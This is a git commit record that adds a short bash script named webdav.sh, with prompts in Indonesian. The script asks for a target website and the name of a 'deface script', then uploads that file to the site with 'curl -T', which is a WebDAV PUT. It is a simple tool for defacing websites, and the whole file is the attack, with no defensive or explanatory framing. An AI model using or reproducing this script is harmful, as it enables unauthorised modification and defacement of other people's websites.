2145463325336000d8935a748daa9b3d245def67
bartesdwiky <45339295+bartesdwiky@users.noreply.github.com>
2018-11-25 19:36:25 +0000

    Update and rename .gitignore to webdav.sh

---
+++ webdav.sh
@@ -0,0 +1,8 @@
+clear
+cowsay -f eyes 'Bartes Dwiky' | lolcat
+
+
+read -p " Website Target ==> " target
+read -p " Nama sript Defacenya ==> " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [!] Suksess... "
